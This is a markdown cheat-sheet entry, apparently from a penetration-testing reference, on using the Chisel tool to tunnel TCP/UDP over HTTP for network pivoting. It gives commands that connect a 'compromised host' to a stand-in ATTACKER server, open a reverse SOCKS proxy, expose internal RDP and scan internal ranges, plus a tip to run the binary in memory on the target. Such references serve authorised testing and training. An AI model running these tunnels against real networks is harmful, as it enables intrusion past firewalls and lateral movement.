---
name: Chisel
category: Connection & Pivoting
description: Fast TCP/UDP tunnel over HTTP, secured by SSH — ideal for pivoting.
tags: [tunnel, pivot, socks, portforward, http, ssh]
---

# Chisel

**Chisel** creates TCP/UDP tunnels carried over HTTP and secured with SSH. Because the traffic looks like HTTP, it's handy for **pivoting** out of networks whose egress firewall only allows web traffic. One Go binary serves as both server and client.

> [github.com/jpillora/chisel](https://github.com/jpillora/chisel) · run the server on the attacker and the client on the compromised host (or vice versa)

## Concepts

- **server** — listens and accepts tunnels.
- **client** — connects to the server and defines forwarding rules.
- **reverse** — flips the direction: the server exposes ports on the client's behalf.

## Reverse SOCKS proxy (the most common pivoting case)

```bash
# 1) On the ATTACKER (server), accepting reverse tunnels:
./chisel server -p 8080 --reverse

# 2) On the compromised host (client), open a SOCKS5 on the attacker:
./chisel client ATTACKER:8080 R:1080:socks
```

Now `127.0.0.1:1080` on the attacker is a SOCKS5 proxy that egresses through the target's internal network:

```bash
proxychains nmap -sT 10.10.10.0/24        # set "socks5 127.0.0.1 1080" in proxychains
curl --socks5 127.0.0.1:1080 http://10.10.10.5
```

## Specific port forwarding (remote)

```bash
# Expose internal RDP 10.10.10.9:3389 on the attacker's port 3389
# Server (attacker):
./chisel server -p 8080 --reverse
# Client (target):
./chisel client ATTACKER:8080 R:3389:10.10.10.9:3389
```

## Local forward (from client to a server-side service)

```bash
./chisel server -p 8080
./chisel client ATTACKER:8080 2222:127.0.0.1:22     # local 2222 -> server's ssh
```

## Tunnel security

```bash
./chisel server -p 8080 --reverse --auth user:pass        # require credentials
./chisel client --auth user:pass ATTACKER:8080 R:1080:socks
# Fingerprint to prevent MITM:
./chisel server -p 8080 --reverse            # prints the fingerprint
./chisel client --fingerprint <fp> ATTACKER:8080 R:1080:socks
```

> Tip: transfer the small binary to the target (via [netcat](#/tool/netcat) or HTTP) and run it in memory when possible. Use `--auth` and `--fingerprint` so you don't leave the tunnel open to others. Alternatives: `ligolo-ng`, SSH `-D`/`-L`/`-R`, [socat](#/tool/socat).
